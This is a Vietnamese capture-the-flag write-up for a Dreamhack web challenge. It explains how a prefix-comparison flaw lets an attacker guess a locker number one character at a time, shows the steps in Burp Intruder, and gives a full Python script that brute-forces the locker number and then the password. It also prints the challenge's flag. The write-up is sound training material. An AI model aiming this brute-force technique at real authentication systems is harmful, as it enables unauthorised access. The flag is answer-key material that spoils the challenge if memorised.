# Đề bài:
A locker has been assigned to Dream for the new semester. However, Dream, who has a bad memory, forgot all of her locker numbers and lock passwords... Please find out the locker number and lock password for Dream!
The locker number is a 4-digit random string containing lowercase letters or numbers, and the password is a random integer between 100 and 200. If both values are entered correctly, a flag is output. The flag is in `FLAG` a variable.

The flag format is DH {...} This is it.
https://dreamhack.io/wargame/challenges/931
# Solution
Quan sát source code ta thấy đây đơn giản là 1 bài bruteforce cơ bản vì `locker_num` chỉ có 4 digits (bruteforcetable)

Có thể bruteforce bằng code python hoặc ta sử dụng tính năng Burp Intruder

Ở route `/` có 
```python
...
if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
        ...
    return render_template("index.html", result = "Good")
        else: 
            return render_template("index.html", result = "Wrong!")
```

Để ý `rand_str[0:len(locker_num)] == locker_num` nghĩa là nếu `locker_num` có bao nhiêu chữ số thì chỉ kiểm tra với `rand_str` với chừng đó chữ
:::info

Giả sử server tạo ra:
rand_str = "a7k2"

| Giá trị gửi | So sánh thực tế       | Phản hồi |
|-------------|-----------------------|----------|
| "a"         | "a" == "a"            | Good     |
| "a7"        | "a7" == "a7"          | Good     |
| "a7k"       | "a7k" == "a7k"        | Good     |
| "a7k2"      | "a7k2" == "a7k2"      | Good     |
| "b"         | "b" != "a"            | Wrong!   |
| "a7x"       | "a7x" != "a7k"        | Wrong!   |
:::

Từ giờ, nhiệm vụ của ta là bruteforce lần lượt 4 digits của `locker_num`, sau đó brute force số từ 100 -> 200 của `password`
## Burp Intruder
Ở mục Intruder, ta vào Payloads và chọn bruteforcer
![image](https://hackmd.io/_uploads/HJFwfV9jMe.png)
đổi `min length` và `max length` thành 1
![image](https://hackmd.io/_uploads/B1GemN5jGe.png)
Tiếp đến vào Settings rồi `grep match` `Good` 
Lần brute đầu tiên thu được kí tự `a` đúng 
![image](https://hackmd.io/_uploads/H1sYmV9iGl.png)
Thêm a vào trước chỗ chèn payload rồi làm tương tự
![image](https://hackmd.io/_uploads/B1YlNNqjze.png)
Ta có được `locker_num` = `a5wa`
Sau đó chuyển qua bruteforce `password`
![image](https://hackmd.io/_uploads/SkRjBEcjzx.png)
Sau khi sort theo length thì thấy `password` = 188 sẽ trả về flag
![image](https://hackmd.io/_uploads/HJKFO4qofe.png)
![image](https://hackmd.io/_uploads/HJm2_45sfl.png)
-> Flag: `DH{2e583205a2555b8890d141b51cee41379cead9a65a957e72d4a99568c0a2f955}`
## `Solve.py`
```python
import re
import string
import requests

# ===== Chỉnh lại cho đúng challenge =====
BASE = "http://<HOST>:<PORT>/"        # URL của challenge
PATH = "/"                         
LOCKER_PARAM = "locker_num"           
PASS_PARAM = "password"           
GOOD_MARK = "Good"               
LOCKER_LEN = 4
CHARSET = string.ascii_lowercase + string.digits
FLAG_RE = re.compile(r"DH\{[^}\s]+\}")  # đổi nếu flag khác format
# ========================================

session = requests.Session()


def send(data):
    return session.post(BASE + PATH, data=data, timeout=10)


def recover_locker():
    known = ""
    for _ in range(LOCKER_LEN):
        for c in CHARSET:
            guess = known + c
            r = send({LOCKER_PARAM: guess, PASS_PARAM: "100"})
            if GOOD_MARK in r.text:
                known += c
                print(f"[+] Locker: {known}")
                break
        else:
            raise RuntimeError(f"Không tìm được ký tự tại vị trí {len(known)}")
    return known


def recover_password(locker):
    bodies = {}
    for p in range(100, 201):
        r = send({LOCKER_PARAM: locker, PASS_PARAM: str(p)})
        bodies[p] = r.text
        if FLAG_RE.search(r.text):
            return p, r.text

    # Không thấy flag trực tiếp: tìm response có độ dài lạ nhất
    lengths = {}
    for p, body in bodies.items():
        lengths.setdefault(len(body), []).append(p)
    for ln, ps in sorted(lengths.items(), key=lambda x: len(x[1])):
        if len(ps) == 1:
            return ps[0], bodies[ps[0]]
    return None, None


if __name__ == "__main__":
    locker = recover_locker()
    pw, body = recover_password(locker)
    m = FLAG_RE.search(body) if body else None
    print(m.group(0) if m else "[-] Không thấy flag, kiểm tra lại thủ công")
```